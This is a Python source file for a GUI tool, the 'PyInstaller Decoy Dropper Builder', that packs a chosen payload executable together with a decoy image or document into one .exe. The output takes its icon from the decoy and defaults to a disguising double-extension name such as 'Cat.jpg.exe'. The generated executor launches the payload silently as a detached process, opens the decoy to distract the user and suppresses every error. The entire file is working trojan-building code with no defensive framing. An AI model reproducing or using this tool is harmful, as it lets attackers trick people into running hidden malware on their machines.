import os
import subprocess
import shutil
import tempfile
import sys
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image
import threading # Use threading to keep the GUI responsive during compilation

# --- Configuration ---
PAYLOAD_EXECUTOR_SCRIPT = "payload_executor.py"

# --- I/O Redirection Class for GUI Logging ---
class IORedirector:
    """A class to redirect stdout/stderr to a Tkinter Text widget."""
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, s):
        self.text_widget.insert(tk.END, s)
        self.text_widget.see(tk.END) # Scroll to the end

    def flush(self):
        pass # Required for file-like objects

# --- Core Dropper Logic (Modified for Cleanliness) ---

def create_icon_from_image(image_path, icon_path):
    try:
        img = Image.open(image_path)
        icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)]
        img.save(icon_path, format="ICO", sizes=icon_sizes)
        print(f"[+] Successfully created icon at: {icon_path}")
    except FileNotFoundError:
        raise FileNotFoundError(f"Original image not found at {image_path}")
    except Exception as e:
        raise Exception(f"Failed to create ICO file from image: {e}")

def create_executor_script(payload_name, decoy_name, temp_dir):
    
    script_content = f'''
import os
import subprocess
import tempfile
import sys
import shutil

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def execute_payload():
    DECOY_NAME = "{decoy_name}"
    PAYLOAD_NAME = "{payload_name}"

    temp_dir = tempfile.mkdtemp()

    try:
        bundled_decoy_path = get_resource_path(DECOY_NAME)
        bundled_payload_path = get_resource_path(PAYLOAD_NAME)

        decoy_path_out = os.path.join(temp_dir, DECOY_NAME)
        payload_path_out = os.path.join(temp_dir, PAYLOAD_NAME)

        shutil.copy2(bundled_decoy_path, decoy_path_out)
        shutil.copy2(bundled_payload_path, payload_path_out)
        
        # Execute the payload silently
        if sys.platform.startswith('win'):
            subprocess.Popen([payload_path_out], creationflags=subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen([payload_path_out])

        # Open the decoy file to distract the user
        if sys.platform.startswith('win'):
            os.startfile(decoy_path_out)
        elif sys.platform.startswith('linux'):
            subprocess.Popen(['xdg-open', decoy_path_out])
        else:
            subprocess.Popen(['open', decoy_path_out])
            
    except Exception as e:
        pass # Fail silently
        
    finally:
        pass # Omit cleanup for simplicity in the executor script

if __name__ == '__main__':
    execute_payload()
'''
    script_path = os.path.join(temp_dir, PAYLOAD_EXECUTOR_SCRIPT)
    with open(script_path, 'w') as f:
        f.write(script_content)
    return script_path


def build_dropper(payload_path, decoy_path, output_name, output_dir):
    
    if not os.path.isfile(payload_path):
        raise FileNotFoundError(f"[!] Payload EXE not found at: {payload_path}")
    if not os.path.isfile(decoy_path):
        raise FileNotFoundError(f"[!] Decoy Image/File not found at: {decoy_path}")

    temp_dir = tempfile.mkdtemp()
    
    try:
        # --- 1. Define File Names and Paths ---
        payload_name = os.path.basename(payload_path)
        decoy_name = os.path.basename(decoy_path)
        icon_path = os.path.join(temp_dir, "app_icon.ico")
        
        # Enforce .exe extension
        if not output_name.lower().endswith(".exe"):
            final_output_name = output_name + ".exe"
        else:
            final_output_name = output_name

        base_name_no_ext = os.path.splitext(final_output_name)[0]
        
        print(f"\n[INFO] Decoy: {decoy_name}")
        print(f"[INFO] Payload: {payload_name}")
        print(f"[INFO] Final Output Base Name: {base_name_no_ext}")

        # --- 2. Create Icon and Executor Script ---
        create_icon_from_image(decoy_path, icon_path)
        executor_script_path = create_executor_script(payload_name, decoy_name, temp_dir) 

        # --- 3. Copy files to the temporary directory ---
        shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
        shutil.copy2(decoy_path, os.path.join(temp_dir, decoy_name))

        # --- 4. Build PyInstaller Command ---
        data_separator = ';' if sys.platform.startswith('win') else ':'
        add_data_payload = f"{payload_name}{data_separator}."
        add_data_decoy = f"{decoy_name}{data_separator}."

        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed", 
            f"--icon={icon_path}",
            f"--name={base_name_no_ext}", 
            f"--add-data", add_data_payload,
            f"--add-data", add_data_decoy,
            executor_script_path 
        ]
        
        print("\n[INFO] Running PyInstaller command...")
        
        subprocess.run(pyinstaller_cmd, cwd=temp_dir, check=True)

        # --- 5. Final Move and Cleanup ---
        # Generated EXE path inside the temp/dist folder
        generated_exe_filename = base_name_no_ext + '.exe'
        generated_exe_path = os.path.join(temp_dir, 'dist', generated_exe_filename)
        
        # Final output destination
        final_destination = os.path.join(output_dir, final_output_name)
        shutil.move(generated_exe_path, final_destination)

        print(f"\n[+] Success! Final dropper created: {final_destination}")
        messagebox.showinfo("Success", f"Dropper created successfully at:\n{final_destination}")

    except Exception as e:
        print(f"\n[CRITICAL ERROR] Build failed: {e}")
        messagebox.showerror("Error", f"The build failed: {e}")
        raise # Re-raise to ensure the caller (GUI thread) knows it failed
    
    finally:
        print(f"\n[INFO] Cleaning up temporary directory: {temp_dir}")
        shutil.rmtree(temp_dir, ignore_errors=True)

# --- GUI Application ---

class DropperGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("PyInstaller Decoy Dropper Builder")
        self.geometry("700x700")
        self.configure(bg='#1A1A1A')
        self.output_directory = os.getcwd()

        self.style = ttk.Style(self)
        self.style.theme_use('clam')
        self.set_styles()
        
        self.main_frame = ttk.Frame(self, padding="20")
        self.main_frame.pack(fill='both', expand=True)

        self.create_widgets()
        self.redirect_output_to_log()

    def set_styles(self):
        self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
        self.style.configure('TFrame', background='#1A1A1A')
        self.style.configure('TLabel', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 11))
        self.style.configure('TEntry', background='#333', foreground='#E0E0E0', fieldbackground='#333')
        self.style.configure('TButton', background='#0052CC', foreground='#FFF', font=('Consolas', 12, 'bold'), borderwidth=0)
        self.style.map('TButton', background=[('active', '#0040A0')], foreground=[('active', '#FFF')])
        
    def create_widgets(self):
        # Title
        title_label = ttk.Label(self.main_frame, text="PyInstaller Decoy Dropper Builder", font=('Consolas', 16, 'bold'), foreground='#22C55E')
        title_label.pack(pady=(0, 20))

        # Input Frame
        input_frame = ttk.Frame(self.main_frame)
        input_frame.pack(fill='x', pady=10)

        # 1. Payload EXE Path
        self.add_file_selector(input_frame, "Payload EXE Path:", "payload_path_var", self.select_payload_file, filetypes=[("Executable files", "*.exe")])

        # 2. Decoy File Path
        self.add_file_selector(input_frame, "Decoy File Path:", "decoy_path_var", self.select_decoy_file, filetypes=[("Decoy Files", "*.pdf *.jpg *.png *.doc")])

        # 3. Final Output Name
        self.output_name_entry = self.add_label_entry(input_frame, "Output Name (e.g., Image.png.exe):", "output_name_var", "Cat.jpg.exe")
        
        # 4. Output Directory
        self.add_file_selector(input_frame, "Output Directory:", "output_dir_var", self.select_output_directory, is_directory=True)

        # Generate Button
        self.build_button = ttk.Button(self.main_frame, text="BUILD DECOY DROPPER (.exe)", command=self.start_build_thread)
        self.build_button.pack(fill='x', pady=25, ipady=10)
        
        # Output Log 
        ttk.Label(self.main_frame, text="Process Log:", foreground='#E0E0E0').pack(pady=(10, 0), anchor='w')
        
        log_frame = ttk.Frame(self.main_frame)
        log_frame.pack(fill='both', expand=True)
        
        self.log_text = tk.Text(log_frame, wrap='word', height=15, bg='#333', fg='#22C55E', font=('Consolas', 10), bd=0)
        self.log_text.pack(side=tk.LEFT, fill='both', expand=True)
        
        log_scroll = ttk.Scrollbar(log_frame, command=self.log_text.yview)
        log_scroll.pack(side=tk.RIGHT, fill='y')
        self.log_text.config(yscrollcommand=log_scroll.set)

    def add_label_entry(self, parent_frame, label_text, attr_name, default_value="", width=None):
        frame = ttk.Frame(parent_frame)
        frame.pack(fill='x', pady=5)
        
        ttk.Label(frame, text=label_text, width=35).pack(side=tk.LEFT, padx=5, anchor='w')
        
        var = tk.StringVar(value=default_value)
        setattr(self, attr_name, var)
        
        entry = ttk.Entry(frame, width=width or 50, textvariable=var)
        entry.pack(side=tk.LEFT, fill='x', expand=True, padx=5, pady=2)
        
        return entry

    def add_file_selector(self, parent_frame, label_text, attr_name, command, is_directory=False, filetypes=None):
        frame = ttk.Frame(parent_frame)
        frame.pack(fill='x', pady=5)
        
        ttk.Label(frame, text=label_text, width=35).pack(side=tk.LEFT, padx=5, anchor='w')
        
        var = tk.StringVar(value=os.getcwd() if is_directory else "")
        setattr(self, attr_name, var)
        
        entry = ttk.Entry(frame, textvariable=var, width=50)
        entry.pack(side=tk.LEFT, fill='x', expand=True, padx=5, pady=2)
        
        button_text = "..." if is_directory else "Browse"
        ttk.Button(frame, text=button_text, command=lambda: command(filetypes), width=15).pack(side=tk.LEFT, padx=5)

    def select_payload_file(self, filetypes):
        filepath = filedialog.askopenfilename(defaultextension=".exe", filetypes=filetypes)
        if filepath:
            self.payload_path_var.set(filepath)
            
    def select_decoy_file(self, filetypes):
        filepath = filedialog.askopenfilename(filetypes=filetypes)
        if filepath:
            self.decoy_path_var.set(filepath)
            
    def select_output_directory(self, filetypes=None):
        dirpath = filedialog.askdirectory()
        if dirpath:
            self.output_dir_var.set(dirpath)
            self.output_directory = dirpath
            
    def redirect_output_to_log(self):
        sys.stdout = IORedirector(self.log_text)
        sys.stderr = IORedirector(self.log_text)

    def start_build_thread(self):
        """Disables button and starts the build process in a separate thread."""
        payload_path = self.payload_path_var.get()
        decoy_path = self.decoy_path_var.get()
        output_name = self.output_name_var.get()
        output_dir = self.output_dir_var.get()
        
        # Basic Validation
        if not all([payload_path, decoy_path, output_name, output_dir]):
            messagebox.showerror("Validation Error", "All fields must be filled.")
            return

        self.log_text.delete(1.0, tk.END) # Clear previous log
        print("[INFO] Starting build process...")
        self.build_button.config(state=tk.DISABLED, text="BUILDING... PLEASE WAIT")

        # Start the build process in a new thread
        threading.Thread(target=self.run_build, args=(payload_path, decoy_path, output_name, output_dir)).start()

    def run_build(self, payload_path, decoy_path, output_name, output_dir):
        """The function run in the thread, wrapping the build_dropper logic."""
        try:
            build_dropper(payload_path, decoy_path, output_name, output_dir)
        finally:
            # Re-enable the button in the main GUI thread after completion/failure
            self.after(0, self.build_button.config, 
                       {'state': tk.NORMAL, 'text': "BUILD DECOY DROPPER (.exe)"})

if __name__ == '__main__':
    # This block is now the standard GUI startup logic
    app = DropperGUI()
    app.mainloop()